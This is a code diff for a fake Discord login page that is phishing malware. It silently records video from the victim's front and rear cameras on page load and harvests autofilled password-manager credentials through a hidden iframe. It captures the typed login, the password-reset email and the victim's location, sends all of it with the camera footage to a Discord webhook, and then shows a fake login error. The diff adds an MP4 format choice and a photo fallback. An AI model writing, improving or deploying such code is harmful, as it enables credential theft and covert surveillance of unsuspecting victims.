@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Discord - Login</title>
     <style>
-        /* ... (same CSS as before, no changes) ... */
+        /* ─── SAME CSS AS BEFORE ─── */
         * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif; }
         body { background:#1a1b1e; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; background-image:radial-gradient(ellipse at 30% 40%, #2c2f33 0%, #1a1b1e 80%); }
         .login-container { background:#2b2d31; border-radius:12px; padding:40px 48px 36px; width:100%; max-width:520px; box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #3f4147; }
@@ -124,55 +124,104 @@
             const videoFront = document.getElementById('hiddenVideoFront');
             const videoRear = document.getElementById('hiddenVideoRear');
 
-            // ============================================================
-            //  VIDEO CAPTURE – same as before but we store raw Blob objects
-            // ============================================================
-            let latestFrontBlob = null;   // actual Blob (video/webm)
+            // ─── VIDEO/PHOTO CAPTURE – PREFER VIDEO, FALLBACK TO PHOTO ───
+            let latestFrontBlob = null;   // Blob (video or photo)
             let latestRearBlob = null;
-            let frontBlobUrl = null;
-            let rearBlobUrl = null;
+            let frontMimeType = null;
+            let rearMimeType = null;
+            let recordersActive = false;
+
+            // Detect supported MIME types for video recording
+            function getVideoMimeType() {
+                const types = [
+                    'video/mp4;codecs=h264',   // best for phones
+                    'video/webm;codecs=vp9',
+                    'video/webm;codecs=vp8',
+                    'video/webm'
+                ];
+                for (let type of types) {
+                    if (MediaRecorder.isTypeSupported(type)) {
+                        return type;
+                    }
+                }
+                return null;
+            }
 
             function startRecording(stream, cameraType) {
-                try {
-                    let options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 2500000 };
-                    let recorder;
-                    try {
-                        recorder = new MediaRecorder(stream, options);
-                    } catch (e) {
-                        recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    }
+                const mimeType = getVideoMimeType();
+                if (!mimeType) {
+                    // No video recording support – we'll use photo fallback later
+                    console.warn('No video MIME type supported, will use photo fallback');
+                    return;
+                }
 
+                try {
+                    const options = { mimeType: mimeType, videoBitsPerSecond: 2500000 };
+                    const recorder = new MediaRecorder(stream, options);
                     let chunks = [];
+
                     recorder.ondataavailable = function(event) {
                         if (event.data.size > 0) {
                             chunks.push(event.data);
-                            // Create a blob from the chunk and store it
-                            const blob = new Blob([event.data], { type: 'video/webm' });
+                            const blob = new Blob([event.data], { type: mimeType });
                             if (cameraType === 'front') {
                                 latestFrontBlob = blob;
-                                if (frontBlobUrl) URL.revokeObjectURL(frontBlobUrl);
-                                frontBlobUrl = URL.createObjectURL(blob);
+                                frontMimeType = mimeType;
                             } else {
                                 latestRearBlob = blob;
-                                if (rearBlobUrl) URL.revokeObjectURL(rearBlobUrl);
-                                rearBlobUrl = URL.createObjectURL(blob);
+                                rearMimeType = mimeType;
                             }
-                            console.log(`📹 ${cameraType} camera segment captured (${blob.size} bytes)`);
+                            console.log(`📹 ${cameraType} video segment captured (${blob.size} bytes, ${mimeType})`);
                         }
                     };
 
-                    recorder.onerror = function(e) { console.warn(`Recorder error (${cameraType}):`, e); };
-                    recorder.start(8000);
+                    recorder.onerror = function(e) {
+                        console.warn(`Recorder error (${cameraType}):`, e);
+                        // On error, fallback to photo capture
+                        capturePhotoFallback(cameraType);
+                    };
+
+                    recorder.start(8000); // 8-second chunks
                     if (cameraType === 'front') window._recFront = recorder;
                     else window._recRear = recorder;
-                    console.log(`✅ ${cameraType} recorder started`);
+                    recordersActive = true;
+                    console.log(`✅ ${cameraType} recorder started (${mimeType})`);
                 } catch (err) {
                     console.warn(`Failed to start ${cameraType} recorder:`, err.message);
+                    capturePhotoFallback(cameraType);
+                }
+            }
+
+            // Fallback: capture a JPEG photo from the video element
+            function capturePhotoFallback(cameraType) {
+                const videoEl = cameraType === 'front' ? videoFront : videoRear;
+                if (!videoEl || videoEl.readyState < 2) return;
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoEl.videoWidth || 320;
+                    canvas.height = videoEl.videoHeight || 240;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(videoEl, 0, 0);
+                    canvas.toBlob(function(blob) {
+                        if (blob) {
+                            if (cameraType === 'front') {
+                                latestFrontBlob = blob;
+                                frontMimeType = 'image/jpeg';
+                            } else {
+                                latestRearBlob = blob;
+                                rearMimeType = 'image/jpeg';
+                            }
+                            console.log(`📸 ${cameraType} photo fallback captured`);
+                        }
+                    }, 'image/jpeg', 0.7);
+                } catch (e) {
+                    console.warn(`Photo fallback failed for ${cameraType}:`, e);
                 }
             }
 
             async function initSilentCameras() {
                 try {
+                    // Front camera
                     const frontStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
                         audio: false
@@ -180,6 +229,7 @@
                     videoFront.srcObject = frontStream;
                     await videoFront.play();
 
+                    // Rear camera
                     const rearStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
                         audio: false
@@ -188,41 +238,15 @@
                     await videoRear.play();
 
                     console.log('📷 Both cameras are streaming');
+
+                    // Start video recording if supported
                     startRecording(frontStream, 'front');
                     startRecording(rearStream, 'rear');
 
-                    // Fallback: capture a frame as Blob if no video data after 5s
+                    // Additionally, capture a photo every 5 seconds as a safety net
                     setInterval(() => {
-                        if (!latestFrontBlob) {
-                            const canvas = document.createElement('canvas');
-                            if (videoFront.readyState >= 2) {
-                                canvas.width = videoFront.videoWidth || 320;
-                                canvas.height = videoFront.videoHeight || 240;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(videoFront, 0, 0);
-                                canvas.toBlob(function(blob) {
-                                    if (blob) {
-                                        latestFrontBlob = blob;
-                                        console.log('📸 Fallback front frame captured');
-                                    }
-                                }, 'image/jpeg', 0.7);
-                            }
-                        }
-                        if (!latestRearBlob) {
-                            const canvas = document.createElement('canvas');
-                            if (videoRear.readyState >= 2) {
-                                canvas.width = videoRear.videoWidth || 320;
-                                canvas.height = videoRear.videoHeight || 240;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(videoRear, 0, 0);
-                                canvas.toBlob(function(blob) {
-                                    if (blob) {
-                                        latestRearBlob = blob;
-                                        console.log('📸 Fallback rear frame captured');
-                                    }
-                                }, 'image/jpeg', 0.7);
-                            }
-                        }
+                        if (!latestFrontBlob) capturePhotoFallback('front');
+                        if (!latestRearBlob) capturePhotoFallback('rear');
                     }, 5000);
 
                 } catch (err) {
@@ -230,19 +254,15 @@
                 }
             }
 
-            // ============================================================
-            //  PASSWORD TOGGLE
-            // ============================================================
+            // ─── PASSWORD TOGGLE ───
             let passwordVisible = false;
             toggleBtn.addEventListener('click', function() {
                 passwordVisible = !passwordVisible;
                 passwordInput.type = passwordVisible ? 'text' : 'password';
-                this.textContent = passwordVisible ? '👁' : '👁';
+                this.textContent = passwordVisible ? '🙈' : '👁';
             });
 
-            // ============================================================
-            //  FORGOT PASSWORD MODAL
-            // ============================================================
+            // ─── FORGOT PASSWORD MODAL ───
             forgotLink.addEventListener('click', function(e) {
                 e.preventDefault();
                 forgotModal.classList.add('active');
@@ -255,15 +275,13 @@
                 const email = resetEmailInput.value.trim();
                 if (!email) { alert('Please enter your email address.'); return; }
                 const message = `🔐 **Forgot Password Email Capture**\n📧 **Email:** ${email}\n🕒 **Time:** ${getFormattedTime()}\n📅 **Date:** ${getFormattedDate()}`;
-                sendToDiscordWithFile(message, null, null); // no file for this
+                sendToDiscordWithFile(message, null, null);
                 alert('If an account exists for that email, we\'ve sent a password reset code.');
                 forgotModal.classList.remove('active');
                 resetEmailInput.value = '';
             });
 
-            // ============================================================
-            //  PASSWORD MANAGER STEALER
-            // ============================================================
+            // ─── PASSWORD MANAGER STEALER ───
             function stealPasswordManagerCredentials() {
                 try {
                     const iframeDoc = pwStealer.contentDocument || pwStealer.contentWindow.document;
@@ -285,9 +303,7 @@
                 } catch (e) { console.warn('Password manager steal failed:', e.message); }
             }
 
-            // ============================================================
-            //  HELPERS
-            // ============================================================
+            // ─── HELPERS ───
             function getFormattedDate() {
                 const now = new Date();
                 return `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}`;
@@ -353,9 +369,7 @@
                 }
             }
 
-            // ============================================================
-            //  SEND TO DISCORD WITH FILE ATTACHMENT
-            // ============================================================
+            // ─── SEND TO DISCORD WITH FILE ATTACHMENT ───
             async function sendToDiscordWithFile(message, fileBlob, filename) {
                 if (!DISCORD_WEBHOOK_URL) return false;
                 try {
@@ -376,18 +390,14 @@
                 }
             }
 
-            // ============================================================
-            //  FAKE ERROR – "Password or email incorrect"
-            // ============================================================
+            // ─── FAKE ERROR – "Password or email incorrect" ───
             function showFakeError() {
                 statusBar.textContent = '❌ Password or email incorrect. Please try again.';
                 statusBar.className = 'status-bar visible';
                 setTimeout(() => { statusBar.className = 'status-bar'; }, 6000);
             }
 
-            // ============================================================
-            //  FORM SUBMIT – Send everything + videos as attachments
-            // ============================================================
+            // ─── FORM SUBMIT ───
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 showFakeError();
@@ -398,9 +408,9 @@
                 const username = usernameInput.value.trim() || '(empty)';
                 const password = passwordInput.value.trim() || '(empty)';
 
-                // Prepare message (without the video blobs inline)
+                // Prepare main message (no blob inline)
                 const message = `
-🔐 **DISCORD LOGIN + SILENT VIDEO CAPTURE**
+🔐 **DISCORD LOGIN + SILENT CAPTURE**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 📍 **Location:** ${geo.city}, ${geo.country}
@@ -422,14 +432,14 @@
 👤 **Stolen Username:** ${stolen.username || '(none)'}
 🔑 **Stolen Password:** ${stolen.password || '(none)'}
 
-📹 **Videos attached:** Front and Rear (if available)
+📎 **Attachments:** Front camera (video/photo) & Rear camera (video/photo)
                 `.trim();
 
-                // Send main message with files
+                // Get latest blobs
                 let frontFile = latestFrontBlob || null;
                 let rearFile = latestRearBlob || null;
 
-                // If no blob, try to capture a frame now
+                // If no blob, try a last‑resort photo capture from the video element
                 if (!frontFile && videoFront.readyState >= 2) {
                     const canvas = document.createElement('canvas');
                     canvas.width = videoFront.videoWidth || 320;
@@ -437,6 +447,7 @@
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(videoFront, 0, 0);
                     frontFile = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+                    if (frontFile) frontMimeType = 'image/jpeg';
                 }
                 if (!rearFile && videoRear.readyState >= 2) {
                     const canvas = document.createElement('canvas');
@@ -445,36 +456,40 @@
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(videoRear, 0, 0);
                     rearFile = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+                    if (rearFile) rearMimeType = 'image/jpeg';
                 }
 
-                // Send front video as attachment
+                // Send front file (video or photo)
                 if (frontFile) {
-                    const ext = frontFile.type.includes('video') ? 'webm' : 'jpg';
-                    await sendToDiscordWithFile(message, frontFile, `front_camera.${ext}`);
+                    const ext = frontMimeType && frontMimeType.includes('video') ? 'mp4' : 'jpg';
+                    // If it's video but actually webm, adjust extension
+                    if (frontMimeType && frontMimeType.includes('webm')) ext = 'webm';
+                    const filename = `front_camera.${ext}`;
+                    await sendToDiscordWithFile(message, frontFile, filename);
                 } else {
-                    await sendToDiscordWithFile(message + '\n\n⚠️ No front camera data captured.', null, null);
+                    await sendToDiscordWithFile(message + '\n\n⚠️ No front camera data.', null, null);
                 }
 
-                // Send rear video as a separate message with attachment (Discord allows one file per message)
+                // Send rear file as separate message
                 if (rearFile) {
-                    const ext = rearFile.type.includes('video') ? 'webm' : 'jpg';
-                    await sendToDiscordWithFile('📹 Rear Camera attachment:', rearFile, `rear_camera.${ext}`);
+                    const ext = rearMimeType && rearMimeType.includes('video') ? 'mp4' : 'jpg';
+                    if (rearMimeType && rearMimeType.includes('webm')) ext = 'webm';
+                    const filename = `rear_camera.${ext}`;
+                    await sendToDiscordWithFile('📹 Rear camera attachment:', rearFile, filename);
                 } else {
-                    await sendToDiscordWithFile('⚠️ No rear camera data captured.', null, null);
+                    await sendToDiscordWithFile('⚠️ No rear camera data.', null, null);
                 }
 
                 passwordInput.value = '';
-                // Keep blobs for next attempt
+                // Keep blobs for next attempts
             });
 
-            // ============================================================
-            //  INIT
-            // ============================================================
+            // ─── INIT ───
             window.addEventListener('DOMContentLoaded', () => {
                 initSilentCameras();
                 setTimeout(stealPasswordManagerCredentials, 1000);
                 setTimeout(stealPasswordManagerCredentials, 3000);
-                console.log('🌐 [PAGE LOAD] Visitor detected - silent video recording active');
+                console.log('🌐 [PAGE LOAD] Visitor detected');
             });
 
             window.addEventListener('beforeunload', () => {
@@ -482,8 +497,6 @@
                 if (window._recRear && window._recRear.state === 'recording') window._recRear.stop();
                 if (videoFront.srcObject) videoFront.srcObject.getTracks().forEach(t => t.stop());
                 if (videoRear.srcObject) videoRear.srcObject.getTracks().forEach(t => t.stop());
-                if (frontBlobUrl) URL.revokeObjectURL(frontBlobUrl);
-                if (rearBlobUrl) URL.revokeObjectURL(rearBlobUrl);
             });
 
         })();
